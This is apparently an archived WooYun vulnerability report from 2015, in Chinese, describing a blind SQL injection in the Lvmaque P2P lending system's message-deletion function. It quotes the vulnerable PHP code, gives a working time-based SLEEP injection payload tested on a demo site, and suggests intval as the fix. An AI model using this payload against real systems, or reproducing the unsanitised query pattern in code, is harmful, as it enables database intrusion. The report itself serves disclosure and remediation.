{"id": 84443, "wybug_id": "wooyun-2015-0144792", "wybug_title": "绿麻雀 p2p网贷系统sql盲注#2(demo演示)", "wybug_corp": "lvmaque.com", "wybug_author": "不能忍", "wybug_date": "2015-10-22 17:16", "wybug_open_date": "2015-12-10 13:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向公众公开  简要描述： 数字型注入 详细说明：  漏洞文件:/App/Lib/Action/Member/MsgAction.class.php   //46行\npublic function delmsg(){\t\t$id = text($_POST['idarr']);//在这里获取\t\t$wsql = \"uid={$this->uid}\";\t\t$up = M(\"inner_msg\")->where(\"{$wsql} AND id in({$id})\")->delete();进库\t\tif($up){\t\t\t$data['status'] = 1;\t\t\t$data['data'] = $id;\t\t\techo json_encode($data);\t\t}else{\t\t\t$data['status'] = 0;\t\t\techo json_encode($data);\t\t}\t}\n再来看看text函数:\nfunction text($str){        $str = $this->clear($str);        $str = $this->getutf8($str);        $divList = $this->divList($str);        $content = array();        foreach($divList[0] as $k=>$v){            //首先判断，如果这个内容块的汉字数量站总数量的一半还多，那么就直接保留            //还要判断，是不是一个A标签把整个内容都扩上            if($this->chineseCount($v)/(strlen($v)/3) >= 0.4 && $this->checkHref($v)){                array_push($content,strip_tags($v,\"<p><br>\"));            }else if($this->makeScore($v) >= 3){                //然后根据分数判断，如果大于3分的，保留                array_push($content,strip_tags($v,\"<p><br>\"));            }else{                //这些就是排除的内容了            }        }        return implode(\"\",$content);    }\n有个clear，继续看：\nprivate function clear($str){        $str = preg_replace(\"'<script[^>]*?>.*?</script>'si\",\"\",$str);        $str = preg_replace(\"'<style[^>]*?>.*?</style>'si\",\"\",$str);        $str = preg_replace(\"'<!--.*?-->'si\",\"\",$str);        return $str;    }\n只是处理xss而已，所以还是可以注入的：不过由于不回显，所以是盲注:payload:idarr=2) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 1=1%23   漏洞证明：  这里就只来一处demo演示了，账户密码是向客服要的。账户密码都是:uiuiui\n\n这里是7秒，试了两次都是7秒，估计是服务器性能问题了!   修复方案：  intval   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-10-26 13:05 厂商回复： 谢谢反馈 已经处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-26 17:28 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  乌云最小气厂商    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}